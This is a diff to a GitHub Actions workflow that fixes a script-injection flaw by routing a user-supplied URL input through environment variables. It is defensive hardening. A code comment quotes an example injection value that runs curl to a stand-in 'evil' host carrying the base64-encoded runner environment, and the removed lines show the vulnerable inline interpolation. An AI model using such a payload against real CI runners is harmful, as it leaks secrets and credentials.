@@ -86,21 +86,34 @@ jobs:
           # Read from a repository variable so a fork or a fresh clone still runs,
           # falling back to the known store rather than skipping the bundle scan.
           SHOPIFY_STORE_DOMAIN: ${{ vars.SHOPIFY_STORE_DOMAIN || 'y0k9ve-q1.myshopify.com' }}
+          # Routed through env: rather than interpolated into `run:` directly — a
+          # `workflow_dispatch` string input is attacker-controlled text, and `${{ }}`
+          # substitution happens before bash ever sees the script. A value like
+          # `https://x"; curl evil/$(env|base64) ; echo "` would otherwise execute on
+          # the runner rather than error, however clean the surrounding quoting looks.
+          DIAGNOSE_URL: ${{ inputs.url }}
+          EXPECT_PRODUCTION: ${{ inputs.expect_production }}
         run: |
-          node scripts/diagnose-deployment.mjs \
-            "${{ inputs.url }}" \
-            ${{ inputs.expect_production && '--expect-production' || '' }} \
-            2>&1 | tee diagnose.log
+          args=("$DIAGNOSE_URL")
+          if [ "$EXPECT_PRODUCTION" = "true" ]; then
+            args+=(--expect-production)
+          fi
+          node scripts/diagnose-deployment.mjs "${args[@]}" 2>&1 | tee diagnose.log
 
       # `always()`: a failing diagnosis is the case where the output matters most,
       # and burying it in a red step's log is how the last one went unread.
       - name: Publish the diagnosis
         if: always()
+        env:
+          # Same reasoning as the Diagnose step above: routed through env: instead of
+          # interpolated into `run:`, since this is the same attacker-controlled
+          # workflow_dispatch input.
+          DIAGNOSE_URL: ${{ inputs.url }}
         run: |
           {
             echo "## Deployment diagnosis"
             echo ""
-            echo "**URL:** \`${{ inputs.url }}\`"
+            echo "**URL:** \`$DIAGNOSE_URL\`"
             echo ""
             if [ -s diagnose.log ]; then
               echo '```'
